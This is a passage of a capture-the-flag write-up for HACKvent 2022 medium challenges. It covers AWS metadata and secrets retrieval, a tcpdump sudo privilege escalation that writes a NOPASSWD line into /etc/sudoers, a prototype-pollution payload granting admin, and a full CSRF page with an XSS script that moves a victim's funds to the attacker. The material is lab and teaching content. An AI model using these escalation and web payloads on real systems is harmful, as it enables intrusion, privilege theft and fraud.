    aws: error: the following arguments are required: --secret-id
    oxdf@hacky$ aws secretsmanager get-secret-value --secret-id flag2
    {
        "ARN": "arn:aws:secretsmanager:eu-west-2:839663496474:secret:flag2-UjomOM",
        "Name": "flag2",
        "VersionId": "8a498b78-e73f-4a97-a0c3-74f365d3aa0d",
        "SecretString": "{\"flag2description\":\"Oh Hai! Santa made us split the flag up, he gave this part to me and told me to put it somewhere safe, I figured this was the best place.  The other half he gave to another Elf and told him the same thing, but that Elf told me he just threw it into a bucket!  That doesn't sound safe at all!\",\"flag2\":\"M3r2y-Xm45_Yarr222_<3_Pirate}\",\"what_is_this\":\"Oh I forgot to mention I overheard some of the elves talking about making tags available ... maybe they mean gift tags?! Who knows ... maybe you can make something out of that ... or not :D \"}",
        "VersionStages": [
            "AWSCURRENT"
        ],
        "CreatedDate": 1670706291.128
    }
    

Now I have both halves of the flag.

**Flag:`HV22{H0_h0_h0_H4v3_&_M3r2y-Xm45_Yarr222_<3_Pirate}`**

## HV22.H2

### Challenge

![hv22-ballH2](https://0xdfimages.gitlab.io/img/hv22-ballH2.png) | HV22.H2 The Elves's Secret  
---|---  
Categories: |  ![fun](../img/hv-cat-fun.png)FUN   
Level: | medium  
Author: |  Deaths Pirate   
  
> Uhm…hello? What are you doing here? I thought you were tasked with finding a
> hidden flag in one of the medium challenges??

The second hidden flag shows up in day 11.

### Solution

Looking at the text around the second half of the day 11 flag, it ends with:

> Oh I forgot to mention I overheard some of the elves talking about making
> tags available … maybe they mean gift tags?! Who knows … maybe you can make
> something out of that … or not :D

“tags” is part of the IMDS, though it’s also cut-off by the height limit of
the image. But putting in `http://169.254.169.254/latest/meta-data/tags`
returns:

![image-20221211204309594](https://0xdfimages.gitlab.io/img/image-20221211204309594.png)

`http://169.254.169.254/latest/meta-data/tags/instance` shows:

![image-20221211204346450](https://0xdfimages.gitlab.io/img/image-20221211204346450.png)

And `http://169.254.169.254/latest/meta-data/tags/instance/hidden_flag` gives
the flag:

![image-20221211204415220](https://0xdfimages.gitlab.io/img/image-20221211204415220.png)

**Flag:`HV22{5G0ldRing5QuickGetThem2MtDoom}`**

## HV22.12

### Challenge

![hv22-ball12](https://0xdfimages.gitlab.io/img/hv22-ball12.png) | HV22.12 Funny SysAdmin  
---|---  
Categories: |  ![linux](../img/hv-cat-linux.png)LINUX   
Level: | medium  
Author: |  wangibangi   
  
> Santa wrote his first small script, to track the open gifts on the wishlist.
> However the script stopped working a couple of days ago and Santa has been
> stuck debugging the script. His sysadmin seems to be a bit funny ;)

Starting an instance and loading the page in a browser presents an in browser
terminal:

### Solution

#### Enumeration

In santa’s home directory is the script references in the description:

    
    
    santa@d41998fe-ebd1-4f6c-ba21-7a56e42134c7:/home/santa> ls -la
    total 8
    drwxr-sr-x    1 santa    santa            6 Dec 12 18:06 .
    drwxr-xr-x    1 root     root            19 Nov 20 18:42 ..
    -rw-r--r--    1 santa    santa          211 Nov 20 18:49 .ash_history
    -rwxr-xr-x    1 santa    santa          196 Nov 20 18:49 santa-script.sh
    

It’s quite simple:

    
    
    #!/bin/ash
    echo "$(date)" >> /var/log/wishlist.log
    curl -k https://brick-steep-tower.glitch.me/api/wishlist/items | jq .[].name >> /var/log/wishlist.log
    echo "---------" >> /var/log/wishlist.log
    

The log file is there, but santa can’t read it:

    
    
    santa@d41998fe-ebd1-4f6c-ba21-7a56e42134c7:/home/santa> ls -l /var/log/
    total 4
    drwxr-xr-x    1 root     root            28 Nov 20 18:42 go-dnsmasq
    -rwx-w--w-    1 root     root           420 Nov 20 18:51 wishlist.log
    

But, santa can with `sudo`:

    
    
    santa@d41998fe-ebd1-4f6c-ba21-7a56e42134c7:/home/santa> ls -l /var/log/
    total 4
    drwxr-xr-x    1 root     root            28 Nov 20 18:42 go-dnsmasq
    -rwx-w--w-    1 root     root           420 Nov 20 18:51 wishlist.log
    santa@d41998fe-ebd1-4f6c-ba21-7a56e42134c7:/home/santa> sudo -l
    Matching Defaults entries for santa on d41998fe-ebd1-4f6c-ba21-7a56e42134c7:
        secure_path=/usr/foobar\:/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
    
    User santa may run the following commands on d41998fe-ebd1-4f6c-ba21-7a56e42134c7:
        (root) NOPASSWD: /usr/bin/less /var/log/*
        (root) NOPASSWD: !/usr/bin/less /var/log/*..*
        (root) NOPASSWD: !/usr/bin/less /var/log/* *
        (root) NOPASSWD: /usr/bin/tcpdump
    

It seems the admin has set santa up to read the log and also run `tcpdump`.
The middle two lines are preventing santa from reading files outside of
`/var/log`.

It’s also worth noting that `sudo` is setting the `PATH` to start with
`/usr/foobar`. This path has a handful of common binaries, but each with
screwy results:

    
    
    santa@d41998fe-ebd1-4f6c-ba21-7a56e42134c7:/usr/foobar> ls 
    awk      cat      diff     find     gnugrep  grep     head     ls       more     nl       sed      strings  tac      tail
    santa@d41998fe-ebd1-4f6c-ba21-7a56e42134c7:/usr/foobar> ./awk
    https://www.youtube.com/watch?v=dQw4w9WgXcQ
    santa@d41998fe-ebd1-4f6c-ba21-7a56e42134c7:/usr/foobar> ./cat
    Meow - I like cats
    santa@d41998fe-ebd1-4f6c-ba21-7a56e42134c7:/usr/foobar> ./more
    Hit the road Jack and dont you come back no more, no more, no more, no more
    

So I’ll probably want to avoid using any of these (I actually didn’t run into
these until after solving, but it seems they did cause others issues).

#### tcpdump GTFObin Explanation

The example to run from
[GTFObins](https://gtfobins.github.io/gtfobins/tcpdump/) is this:

    
    
    COMMAND='id'
    TF=$(mktemp)
    echo "$COMMAND" > $TF
    chmod +x $TF
    sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
    

It is putting a command into a temp file, making it executable, and then
calling `tcpdump` with the following arguments:

  * `-l` \- Make stdout line buffered (not actually necessary).
  * `-n` \- Don’t convert addresses to names (not actually necessary).
  * `-i lo` \- Listen on loopback. I’ll change this to something that will get traffic on this challenge.
  * `-w /dev/null` \- Write the results to `/dev/null`. Since I don’t actually care about the results, just throw them away. Still, it is important for `tcpdump` to be writing to a file.
  * `-G 1` \- Will rotate the output file every 1 second.
  * `-W 1` \- Will limit the number of rotated files to 1.
  * `-z $TF` \- Sets `$TF` as the “post rotate command”. This is tyically used to apply compression or some processing to saved files, but here it’s being abused to run my script.
  * `-Z root` \- This sets the user that `tcpdump` tries to drop to after opening the capture device but before saving any data to root, effectively preventing that drop.

This will capture until it gets a hit and then one second later rotate, apply
the script to the file, and then exit for hitting the max number of files.

#### tcpdump GTFObin POC

I’ll write a script that just touches a file in `/tmp`:

    
    
    santa@d41998fe-ebd1-4f6c-ba21-7a56e42134c7:/home/santa> echo -e '#!/bin/bash\n\ntouch /tmp/pwned'
    #!/bin/bash
    
    touch /tmp/pwned
    santa@d41998fe-ebd1-4f6c-ba21-7a56e42134c7:/home/santa> echo -e '#!/bin/bash\n\ntouch /tmp/pwned' > /tmp/0xdf.sh
    santa@730c9b95-fd48-4d50-a446-4fb660e028d0:/home/santa> chmod +x /tmp/0xdf.sh
    

Now I’ll run `tcpdump` as described above:

    
    
    santa@d41998fe-ebd1-4f6c-ba21-7a56e42134c7:/home/santa> sudo tcpdump -ln -i any -w /dev/null -W 1 -G 1 -z /tmp/0xdf.sh
    tcpdump: data link type LINUX_SLL2
    tcpdump: listening on any, link-type LINUX_SLL2 (Linux cooked v2), snapshot length 262144 bytes
    Maximum file limit reached: 1
    1 packet captured
    2 packets received by filter
    0 packets dropped by kernel
    

I do have to change the interface it’s listening on, as the example only
listens on loopback, and won’t get any traffic to trigger the run.

It exits, and the file is there:

    
    
    santa@d41998fe-ebd1-4f6c-ba21-7a56e42134c7:/home/santa> ls -l /tmp/
    total 4
    -rwxr-xr-x    1 santa    santa           30 Dec 12 13:25 0xdf.sh
    -rw-r--r--    1 root     root             0 Dec 12 13:26 pwned
    

#### Shell as root

Getting this execution as root to actually do something that returns a root
shell was a bit tricky, but eventually I’ll get it by writing to the `sudoers`
file. I’ll update my script:

    
    
    santa@d41998fe-ebd1-4f6c-ba21-7a56e42134c7:/home/santa> echo -e '#!/bin/bash\n\necho "santa   ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers' > /tmp/0xdf.sh
    

Now I’ll trigger it with `tcpdump`:

    
    
    santa@d41998fe-ebd1-4f6c-ba21-7a56e42134c7:/home/santa> sudo tcpdump -ln -i any -w /dev/null -W 1 -G 1 -z /tmp/0xdf.sh
    tcpdump: data link type LINUX_SLL2
    tcpdump: listening on any, link-type LINUX_SLL2 (Linux cooked v2), snapshot length 262144 bytes
    Maximum file limit reached: 1
    1 packet captured
    2 packets received by filter
    0 packets dropped by kernel
    

Santa can now run all commands as root without a password:

    
    
    santa@d41998fe-ebd1-4f6c-ba21-7a56e42134c7:/home/santa> sudo -l
    Matching Defaults entries for santa on d41998fe-ebd1-4f6c-ba21-7a56e42134c7:
        secure_path=/usr/foobar\:/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
    
    User santa may run the following commands on d41998fe-ebd1-4f6c-ba21-7a56e42134c7:
        (root) NOPASSWD: /usr/bin/less /var/log/*
        (root) NOPASSWD: !/usr/bin/less /var/log/*..*
        (root) NOPASSWD: !/usr/bin/less /var/log/* *
        (root) NOPASSWD: /usr/bin/tcpdump
        (ALL) NOPASSWD: ALL
    

`sudo -i` will give a root shell:

    
    
    santa@d41998fe-ebd1-4f6c-ba21-7a56e42134c7:/home/santa> sudo -i
    d41998fe-ebd1-4f6c-ba21-7a56e42134c7:~#
    

And read the flag:

    
    
    d41998fe-ebd1-4f6c-ba21-7a56e42134c7:~/secret# cat flag.txt 
    HV22{M4k3-M3-a-S4ndW1ch}
    

**Flag:`HV22{M4k3-M3-a-S4ndW1ch}`**

#### less GTFObin

Initially I went with `less` as it’s easier to exploit. Typically it’s [easier
to exploit](https://gtfobins.github.io/gtfobins/less/#sudo). However, when I
hit `!`, nothing happened. At first it looks like that’s because root is
running with the environment variable `LESSSECURE` set to 1:

    
    
    d41998fe-ebd1-4f6c-ba21-7a56e42134c7:~/secret# env | grep LES
    LESSSECURE=1
    

From the [man page](https://man7.org/linux/man-
pages/man1/less.1.html#SECURITY):

> SECURITY When the environment variable LESSSECURE is set to 1, less runs in
> a “secure” mode. This means these features are disabled:
>  
>  
>               !      the shell command
>  
>               |      the pipe command
>  
>               :e     the examine command.
>  
>               v      the editing command
>  
>               s  -o  log files
>  
>               -k     use of lesskey files
>  
>               -t     use of tags files
>  
>                      metacharacters in filenames, such as *
>  
>                      filename completion (TAB, ^L)
>  
>        Less can also be compiled to be permanently in "secure" mode.
>  

Interestingly, while the author _tried_ to use `LESSSECURE`, it doesn’t work
on the Busybox version of `less` on an Apline container. I think that’s also
why `!` doesn’t work. But `:e` to examine a new file does work, as I’m able to
read other files with it. For example, I can read root’s `.ash_history`:

![image-20221212124823580](https://0xdfimages.gitlab.io/img/image-20221212124823580.png)

Which opens:

![image-20221212124835148](https://0xdfimages.gitlab.io/img/image-20221212124835148.png)

Then I can read `flag.txt` the same way:

![image-20221212124925355](https://0xdfimages.gitlab.io/img/image-20221212124925355.png)

## HV22.13

### Challenge

![hv22-ball13](https://0xdfimages.gitlab.io/img/hv22-ball13.png) | HV22.13 Noty  
---|---  
Categories: |  ![web_security](../img/hv-cat-web_security.png)WEB_SECURITY   
Level: | medium  
Author: |  HaCk0   
  
> After the previous fiasco with multiple bugs in Notme (some intended and
> some not), Santa released a now truly secure note taking app for you.
> Introducing: Noty, a fixed version of Notme.
>
> Also Santa makes sure that this service runs on green energy. No pollution
> from this app ;)

Starting an instance and loading the page in a browser presents an in browser
terminal:

![image-20221213075029257](https://0xdfimages.gitlab.io/img/image-20221213075029257.png)

### Solution

#### Enumeration

The site is _very_ similar to the “Notme” site from day 10. I can register and
get access to the same menu as before:

![image-20221213075204969](https://0xdfimages.gitlab.io/img/image-20221213075204969.png)

After creating a note, it shows up on `/notes`:

![image-20221213075246783](https://0xdfimages.gitlab.io/img/image-20221213075246783.png)

There’s no option to edit notes this time. Clicking on a note does nothing.

#### Requests

Looking at the various requests, creating a note sends a POST with body
`{"note":"Note 1"}` to `/api/note/new`. The response looks like the full note
object:

    
    
    HTTP/2 200 OK
    Content-Type: application/json; charset=utf-8
    Date: Tue, 13 Dec 2022 12:52:12 GMT
    Etag: W/"71-XuuFUOZqoKqUxJQ8CINFAP5V4X8"
    X-Powered-By: Express
    Content-Length: 113
    
    {"id":1,"note":"Note 1","userId":1,"updatedAt":"2022-12-13T12:52:12.941Z","createdAt":"2022-12-13T12:52:12.941Z"}
    

Loading the main page sends a GET to `/api/note/all`, and gets back a list of
these same note objects.

Updating my password from the “Profile” page sends a POST to `/api/user/1` (my
userid is 1) with the body of `{"password":"new_pass"}` and the response
contains my full user object:

    
    
    HTTP/2 200 OK
    Content-Type: application/json; charset=utf-8
    Date: Tue, 13 Dec 2022 12:53:15 GMT
    Etag: W/"c4-GX4DUFOYYoUAZBOvx8VF6ijLSyg"
    X-Powered-By: Express
    Content-Length: 196
    
    {"id":1,"role":"user","username":"0xdf","password":"f3b9f58518f2b212467a8ab5174f1324d8cbdfcbb9028b163605105f85979146","createdAt":"2022-12-13T12:51:20.974Z","updatedAt":"2022-12-13T12:53:15.860Z"}
    

The “role” attribute is interesting. I can try setting that with a payload to
`/api/register` like:

    
    
    {
        "username":"0xdf2",
        "password":"0xdf",
        "role":"admin"
    }
    

But it doesn’t work. I can also try on `/api/user/1` adding a role, but again,
no change in the result.

#### Prototype Pollution

The last line of the challenge prompt is a good hint to look at prototype
pollution, a common attack against Node applications: “No pollution from this
app ;)”.

[This post](https://learn.snyk.io/lessons/prototype-pollution/javascript/)
from Snyk does a pretty good job describing prototype pollution. The issue
comes up when objects are JavaScript are merged unsafely.

Each object in JavaScript has a `__proto__` attribute that holds things that
are like defaults for the object. For example, an object has `__proto__:
{"toString": <function>}`. This is what allows objects to call `.toString()`
and get a result.

If I can set the `__proto__` for the user object to have `{"role":"admin"}`,
then all users will get admin by default.

#### Fails with Password Change

My first attempts are on `/api/user/[id]`. I’ll send a body with the
`__proto__`:

    
    
    {
        "password":"0xdf",
        "__proto__":{
            "role":"admin"
        }
    }
    

This crashes the server:

    
    
    HTTP/2 500 Internal Server Error
    Content-Type: application/json; charset=utf-8
    Date: Tue, 13 Dec 2022 13:20:31 GMT
    Etag: W/"3b-ypol7bSme21vOTNW75iv/m4eapI"
    X-Powered-By: Express
    Content-Length: 59
    
    {"error":"this._customSetters[key].call is not a function"}
    

Still, this is a good sign. It seems that I’ve messed up something in the user
object.

#### Success with Registration

After many fails in the password change API, I’ll turn to the registration
API. I’ll add `__proto__` to the request for a new user, and it comes back as
admin:

![image-20221213082349259](https://0xdfimages.gitlab.io/img/image-20221213082349259.png)

In fact, now if I register another user without the pollution, that user still
comes back as admin:

![image-20221213082441128](https://0xdfimages.gitlab.io/img/image-20221213082441128.png)

On the “My Notes” page, there’s now a note with the flag:

![image-20221213082516104](https://0xdfimages.gitlab.io/img/image-20221213082516104.png)

**Flag:`HV22{P0luT1on_1S_B4d_3vERyWhere}`**

## HV22.14

### Challenge

![hv22-ball14](https://0xdfimages.gitlab.io/img/hv22-ball14.png) | HV22.14 Santa's Bank  
---|---  
Categories: |  ![web_security](../img/hv-cat-web_security.png)WEB_SECURITY   
Level: | medium  
Author: |  nichtseb   
  
> Santa has lost faith and trust in humanity and decided to take matters in
> his own hands: He opens a new bank.
>
> He announced the release with the following message:
>
> For Christmas, our bank has a generous offer: save 100 € in your savings
> account and get a promo code!
>
> Due to mistrust, he didn’t connect his bank and its employees to the
> internet.
>
> Can you hack bank?

Starting an instance and loading the page in a browser redirects to
`/auth/login`:

![image-20221214122614011](https://0xdfimages.gitlab.io/img/image-20221214122614011.png)

### Solution

#### Site

I’ll register and login, and page has more options in the menu, and shows my
account:

![image-20221214124707434](https://0xdfimages.gitlab.io/img/image-20221214124707434.png)

There’s a `/transfer` page that takes a from, to, and amount:

![image-20221214123318431](https://0xdfimages.gitlab.io/img/image-20221214123318431.png)

`/promotion` just says come back when I have 100€:

![image-20221214124725917](https://0xdfimages.gitlab.io/img/image-20221214124725917.png)

`/support` takes a URL and send it to the staff:

![image-20221214123421246](https://0xdfimages.gitlab.io/img/image-20221214123421246.png)

This is a good hint that I can get them to click on a link. There’s also a
logout link.

#### Link Click Test

First I need to know if I can get someone on the site (presumably with 100€ or
more) to click on a link. I’ll connect to the Hacking Lab VPN and send a link
to my VM, `http://10.13.0.22/test`. On submitting, it says:

![image-20221214123659201](https://0xdfimages.gitlab.io/img/image-20221214123659201.png)

Less than a minute later, there’s a hit on my Python webserver:

    
    
    152.96.7.3 - - [14/Dec/2022 17:36:59] code 404, message File not found
    152.96.7.3 - - [14/Dec/2022 17:36:59] "GET /test HTTP/1.1" 404 -
    152.96.7.3 - - [14/Dec/2022 17:36:59] code 404, message File not found
    152.96.7.3 - - [14/Dec/2022 17:36:59] "GET /favicon.ico HTTP/1.1" 404 -
    

#### Reflected XSS in Transfer

Trying to get the transfer to work is a bit tricky.

If I try to transfer from 0xdf to 0xdf, it redirects to the accounts page, and
says that’s not a valid account:

![image-20221214124745028](https://0xdfimages.gitlab.io/img/image-20221214124745028.png)

If I try my account number for both, the error message changes:

![image-20221214124832061](https://0xdfimages.gitlab.io/img/image-20221214124832061.png)

So it seems I need to know the account number of both the sender and receiver.
It also displays back the input username in that first message. I can check it
for reflected XSS by submitting `<script>alert(1)</script>` as one of the
users:

![image-20221214125025216](https://0xdfimages.gitlab.io/img/image-20221214125025216.png)

It works:

![image-20221214125038042](https://0xdfimages.gitlab.io/img/image-20221214125038042.png)

On clicking ok:

![image-20221214125049914](https://0xdfimages.gitlab.io/img/image-20221214125049914.png)

And in the source:

![image-20221214125116075](https://0xdfimages.gitlab.io/img/image-20221214125116075.png)

#### Exploit

I’ll combine these two attacks into a payload that I can host and submit as a
link to the support staff. I’ll show that process in [this
video](https://www.youtube.com/watch?v=XHOvZDLnJ2Y):

The final payload looks like:

    
    
    <html>
        <head>
            <title>Transfer some funds</title>
        </head>
        <body>
            <form method="post" action="https://76ee7cf6-b98a-400b-b66e-1e3a6d4c1665.idocker.vuln.land/transfer" id="evilform">
                <div class="form-outline mb-4">
                    <input name="from" id="from" class="form-control" value="B5DFABBCA8FC34ACF5E6"/>
                    <label class="form-label" for="from">from</label>
                </div>
    
                <div class="form-outline mb-4">
                    <input name="to" id="to" class="form-control" value="<script>setTimeout(()=> {var account = document.getElementsByTagName('tr')[1].getElementsByTagName('td')[0].textContent; fetch('https://76ee7cf6-b98a-400b-b66e-1e3a6d4c1665.idocker.vuln.land/transfer', {method: 'POST', headers: {'Content-Type': 'application/x-www-form-urlencoded'}, body: 'from=' + account + '&to=B5DFABBCA8FC34ACF5E6&amount=100', mode: 'cors'}, 100);})</script>" />
                    <label class="form-label" for="to">to</label>
                </div>
    
                <div class="form-outline mb-4">
                    <input type="number" name="amount" id="amount" class="form-control" value="100" step="0.1"/>
                    <label class="form-label" for="amount">amount</label>
                </div>
    
                <button type="submit" class="btn btn-primary btn-block mb-4">Transfer</button>
            </form>
            <script>
                evilform.submit();
            </script>
        </body>
    </html>
    

On sending, there’s a hit at the webserver:

    
    
    152.96.7.3 - - [14/Dec/2022 18:32:18] "GET /xss.html HTTP/1.1" 200 -
    

And then I have 100 € in my account:

![image-20221214134204386](https://0xdfimages.gitlab.io/img/image-20221214134204386.png)

On the promotions page there’s a flag:

![image-20221214134226022](https://0xdfimages.gitlab.io/img/image-20221214134226022.png)

**Flag:`HV22{XSS_XSRF_TOO_MANYS_XS}`**

[« easy](/hackvent2022/easy)[hard »](/hackvent2022/hard)

[](/hackvent2022/medium)

